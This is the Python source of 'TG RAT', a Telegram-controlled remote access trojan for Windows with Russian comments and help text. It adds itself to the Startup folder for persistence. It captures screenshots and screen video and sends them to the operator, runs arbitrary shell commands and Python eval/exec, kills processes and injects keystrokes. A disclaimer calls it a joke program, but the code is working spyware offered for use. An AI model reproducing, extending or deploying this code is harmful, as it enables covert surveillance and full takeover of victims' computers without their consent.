'''
████████╗░██████╗░  ██████╗░░█████╗░████████╗
╚══██╔══╝██╔════╝░  ██╔══██╗██╔══██╗╚══██╔══╝
░░░██║░░░██║░░██╗░  ██████╔╝███████║░░░██║░░░
░░░██║░░░██║░░╚██╗  ██╔══██╗██╔══██║░░░██║░░░
░░░██║░░░╚██████╔╝  ██║░░██║██║░░██║░░░██║░░░
░░░╚═╝░░░░╚═════╝░  ╚═╝░░╚═╝╚═╝░░╚═╝░░░╚═╝░░░
=============================================
            ｂｙ ｂ１ｔ０ｎｅ
        tg: https://t.me/u53rnm3
    github: https://github.com/ArtemChikc
'''
import telebot
from telebot import types
import time
import webbrowser
import sys
import shutil
import os
import random
import cv2
import threading
import traceback
import psutil

import config
import functions

# pip install pyTelegramBotAPI tabulate PyAutoGUI numpy opencv-python Pillow psutil soundfile sounddevice



# ==== ЮЗЕРС ====

class UsersIDs:
    def __init__(self, key, file):
        self.ENCRYPTION_KEY = key
        self.encrypted_ids_file = file

    # XOR-шифрование/расшифровка
    def xor_crypt(self, data, key):
        key = key.encode('utf-8')
        data = data.encode('utf-8') if isinstance(data, str) else data
        return bytes([data[i] ^ key[i % len(key)] for i in range(len(data))])

    # Чтение зашифрованных ID из файла
    def load_encrypted_ids(self):
        if not os.path.exists(self.encrypted_ids_file):
            return []
        with open(self.encrypted_ids_file, "rb") as f:
            return [line.strip() for line in f.readlines()]

    # Добавление нового ID (с шифрованием)
    def add_user_id(self, user_id):
        encrypted_id = self.xor_crypt(str(user_id), self.encrypted_ids_file)
        with open(self.encrypted_ids_file, "ab") as f:
            f.write(encrypted_id + b"\n")

    # Расшифровка всех ID
    def decrypt_all_ids(self):
        encrypted_ids = self.load_encrypted_ids()
        return [self.xor_crypt(eid, self.encrypted_ids_file).decode('utf-8') for eid in encrypted_ids]



# ==== РАБОТА ====

class TGRat:
    def __init__(self, config):
        self.config = config
        self.users_ids = UsersIDs(self.config.ENCRYPTION_KEY, self.config.encrypted_ids_file)

        self.bot = telebot.TeleBot(self.config.TELEGRAM_API)
        self.key = self.config.TELEGRAM_API.split(":")[0]

        self.start_handlers()


    def start_handlers(self):
        @self.bot.message_handler(commands=['start'])
        def start_welcome(message):
            self.welcome(message)

        @self.bot.message_handler(content_types=["text"])
        def start_wtf(message):
            self.wtf(message)

        @self.bot.message_handler(content_types=['audio', 'photo', 'gif'])
        def start_handle_audio_photo_gif(message):
            self.handle_audio_photo_gif(message)

        @self.bot.message_handler(content_types=["document"])
        def start_handle_documents(message):
            self.handle_documents(message)


    def welcome(self, message):
        self.config.create_temp_path()

        if message.chat.type=='private' and str(message.from_user.id) in self.users_ids.decrypt_all_ids():
            markup = types.ReplyKeyboardMarkup(resize_keyboard=True)

            markup.add(types.KeyboardButton("/b volumeup"), types.KeyboardButton("/b volumedown"), types.KeyboardButton("/b win"))
            markup.add(types.KeyboardButton("/b esc"), types.KeyboardButton("/b f11"), types.KeyboardButton("/b capslock"))
            markup.add(types.KeyboardButton("/b shift+alt"), types.KeyboardButton("/b alt+f4"), types.KeyboardButton("/b alt+tab"))
            markup.add(types.KeyboardButton("/see_process"), types.KeyboardButton("/screen"), types.KeyboardButton("/video"))

            pc_info = functions.pcinfo()
            help_c = '''================ Работа ================
Команды:
/dota_msg *** -отправить сообщение, если чел играет в доту
/see_process (***) -получить список процессов и их нагрузку, возможно просмотреть определённый процесс
/cl_process *** -закрыть процесс (explorer.exe)
/op_process *** -открыть процесс (notepad.exe)
/op_site *** -открыть сайт
/eval ***
/exec *** -выполнить Python команду(ы)
/msg_i или /msg_e *** -вывести на экран сообщение в виде инфо или в виде ошибки
/delete_temp_files -удалить временные файлы (включая те которые вы скачивали)
/set_default_cursor -поставить дефолт курсор
/screen -получить скрин с компа
/video -получить 5 секундное видео с компа
так же есть команды: /c *** -сист. команда, /b *** -прожать кнопку(и) (можно написать "random"), /t *** -написать текст

Дополнительные функции:
-на все предыдущие команды можно написать количевство их выполнения (3 значение в вызове, пример 10 повышения звука: /b volumeup 10)
-можно писать скрипты (выполнение комманд по очереди в одном сообщении), для этого команды надо писать на разных строках, можно использовать команду /sl *** -ожидание в секундах
-есть возможность изменять громкость используя команду /b (volumeup или volumedown)
-можно прислать файлы чтоб они открылись: фото (есть атрибуты: -fs для полноэкранного режима, -wlp для установления обоев), звуковой файл и .ico/.crs файл с атрибутом -crs чтобы установить курсор мыши

ПРОГРАММА СДЕЛАНА ИСКЛЮЧИТЕЛЬНО В ШУТОЧНЫХ ЦЕЛЯХ!!! КАТЕГОРИЧЕСКИ НЕЛЬЗЯ ИСПОЛЬЗОВАТЬ ДЛЯ НАНЕСЕНИЯ ВРЕДА КОМПЬЮТЕРУ И СЛЕЖКИ!!!

<b><i>by b1t0ne</i></b>
github: https://github.com/ArtemChikc'''

            functions.pag.screenshot(self.config.screen_path)
            self.bot.send_message(message.chat.id, f"{pc_info}\n\n{help_c}".format(message.from_user, self.bot.get_me()), parse_mode="HTML", reply_markup=markup)
            self.bot.send_photo(message.chat.id, open(self.config.screen_path, 'rb'))


    def wtf(self, message):
        global duration

        self.config.create_temp_path()

        try:
            if message.chat.type=='private' and str(message.from_user.id) in self.users_ids.decrypt_all_ids():
                commands = message.text.splitlines()

                for com in commands:
                    text_split = functions.split_command(com.strip())

                    for i in range(text_split[2]):
                        if text_split[0]=='/sl':
                            time.sleep(int(text_split[1]))

                        elif text_split[0]=='/dota_msg':
                            functions.send_key("shift+enter")
                            time.sleep(0.3)
                            functions.pag.typewrite(text_split[1], interval=0.01)
                            functions.send_key("enter")

                        elif text_split[0]=='/see_process':
                            if text_split[1]:
                                task = text_split[1]
                            else:
                                task = None
                            self.bot.send_message(message.chat.id, f"```\n{functions.get_processes_table(task)}\n```", parse_mode='MarkdownV2')

                        elif text_split[0]=='/cl_process':
                            try:
                                os.system(f'taskkill /f /im {text_split[1]}')
                            except:
                                pass

                        elif text_split[0]=='/op_process':
                            try:
                                os.startfile(text_split[1])
                            except:
                                pass

                        elif text_split[0]=='/op_site':
                            webbrowser.open(text_split[1], new=2)
                            time.sleep(1)
                            functions.send_key("f11")

                        elif text_split[0]=='/screen':
                            functions.pag.screenshot(self.config.screen_path)
                            self.bot.send_photo(message.chat.id, open(self.config.screen_path, 'rb'))

                        elif text_split[0]=='/eval':
                            try:
                                self.bot.send_message(message.chat.id, eval(text_split[1]))
                            except Exception as e:
                                self.bot.send_message(message.chat.id, str(e))
                        
                        elif text_split[0]=='/exec':
                            try:
                                self.bot.send_message(message.chat.id, exec(text_split[1]))
                            except Exception as e:
                                self.bot.send_message(message.chat.id, str(e))

                        elif text_split[0]=='/msg_i' or text_split[0]=='/msg_e':
                            functions.show_message(text_split[0], text_split[1])

                        elif text_split[0]=='/delete_temp_files':
                            try:
                                shutil.rmtree(self.config.temp_path)
                                os.makedirs(self.config.temp_path)
                            except: pass

                        elif text_split[0]=='/set_default_cursor':
                            response = functions.restore_system_cursor()
                            self.bot.send_message(message.chat.id, response)

                        elif text_split[0]=="/b":
                            keys = ['f1', 'f2', 'f3', 'f4', 'f5', 'f6', 'f7', 'f8', 'f9', 'f10', 'f11', 'f12',
                                    'esc', 'tab', 'capslock', 'shift', 'ctrl', 'alt', 'enter', 'space', 'backspace'] + \
                                        list('abcdefghijklmnopqrstuvwxyz')
                            modifiers = ['shift', 'ctrl', 'alt']
                            if text_split[1]=='random':
                                if random.choices([True, False], weights=[30, 70])[0]:
                                    buttons = f"{random.choice(modifiers)}+{random.choice(keys)}"
                                else:
                                    buttons = random.choice(keys)
                            else:
                                buttons = text_split[1]
                            functions.send_key(buttons)
                        elif text_split[0]=="/t":
                            try:
                                functions.send_key(text_split[1])
                            except:
                                functions.pag.typewrite(text_split[1], interval=0.01)
                                functions.send_key("enter")
                        elif text_split[0]=="/c":
                            os.system(text_split[1])

                        if (text_split[0] in ["/exec", "/op_site", "/op_process", "/cl_process", "/dota_msg"] and len(commands)==1) or text_split[0]=="/video":
                            if len(text_split)>=4:
                                duration = int(text_split[3])
                            self.bot.send_video(message.chat.id, functions.vid_capture(self.config.video_filename, self.config.fps, self.config.duration))

                self.bot.delete_message(message.chat.id, message.message_id)

            elif message.text==self.key and not str(message.from_user.id) in self.users_ids.decrypt_all_ids():
                self.users_ids.add_user_id(str(message.from_user.id))

        except Exception as e:
            self.bot.send_message(message.chat.id, "ОШИБКА: "+traceback.format_exc())


    def handle_audio_photo_gif(self, message):
        if message.chat.type=='private' and str(message.from_user.id) in self.users_ids.decrypt_all_ids():
            self.config.create_temp_path()

            if message.content_type=='photo':
                photo = message.photo[-1]
                file_info = self.bot.get_file(photo.file_id)
                file_extension = os.path.splitext(file_info.file_path)[1]
                file_name = os.path.join(self.config.temp_path, f"image{file_extension}")
                try:
                    with open(file_name, "wb") as new_file:
                        new_file.write(self.bot.download_file(file_info.file_path))
                except:
                    return

                if "-fs" in message.caption:
                    image = cv2.imread(file_name)
                    screen_width, screen_height = functions.pag.size()
                    resized_image = cv2.resize(image, (screen_width, screen_height))
                    cv2.imwrite(file_name, resized_image)

            else:
                if message.content_type=='audio':
                    file_info = self.bot.get_file(message.audio.file_id)
                    file_extension = os.path.splitext(file_info.file_path)[1]
                    file_name = os.path.join(self.config.temp_path, f"audio{file_extension}")

                elif message.content_type=='gif':
                    file_info = self.bot.get_file(message.document.file_id)
                    file_extension = os.path.splitext(file_info.file_path)[1]
                    if file_extension.lower() == '.gif':
                        file_name = os.path.join(self.config.temp_path, "animation.gif")

                try:
                    with open(file_name, "wb") as new_file:
                        new_file.write(self.bot.download_file(file_info.file_path))
                except:
                    return

            if message.content_type=='audio':
                threading.Thread(target=functions.play_sound, args=(file_name,), daemon=True).start()
            else:
                if "-wlp" in message.caption:
                    response = functions.change_wallpaper(file_name)
                    self.bot.send_message(message.chat.id, response)
                else:
                    threading.Thread(target=functions.open_win, args=(file_name,), daemon=True).start()

            self.bot.send_video(message.chat.id, functions.vid_capture(self.config.video_filename, self.config.fps, self.config.duration))


    def handle_documents(self, message):
        if message.chat.type=='private' and str(message.from_user.id) in self.users_ids.decrypt_all_ids():
            try:
                if ('-d' in message.caption) or ('-crs' in message.caption):
                    file_info = self.bot.get_file(message.document.file_id)
                    downloaded_file = self.bot.download_file(file_info.file_path)
                    self.config.create_temp_path()
                    original_filename = os.path.join(self.config.temp_path, message.document.file_name)
                    with open(original_filename, 'wb') as new_file:
                        new_file.write(downloaded_file)

                if "-crs" in message.caption:
                    response = functions.set_system_cursor(original_filename)
                    self.bot.send_message(message.chat.id, response)
                    self.bot.send_video(message.chat.id, functions.vid_capture(self.config.video_filename, self.config.fps, self.config.duration))

                else:
                    self.bot.send_message(message.chat.id, f"Файл {original_filename} успешно сохранён")
            except Exception as e:
                self.bot.send_message(message.chat.id, f"Ошибка: {traceback.format_exc()}")



def copy_to_startup():
    startup_path = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows',
                                'Start Menu', 'Programs', 'Startup')
    current_file_path = os.path.abspath(sys.argv[0])
    try:
        shutil.copy(current_file_path, startup_path)
    except: pass

def main():
    rat = TGRat(config.Config())
    copy_to_startup()
    for id in rat.users_ids.decrypt_all_ids():
        rat.bot.send_message(id, "Компьютер запущен.")
    try:
        rat.bot.polling(interval=1, skip_pending=True)
    except Exception as e:
        for id in rat.users_ids.decrypt_all_ids():
                rat.bot.send_message(id, f"КРИТИЧЕСКАЯ ОШИБКА: {traceback.format_exc()}")



if __name__ == "__main__":
    main()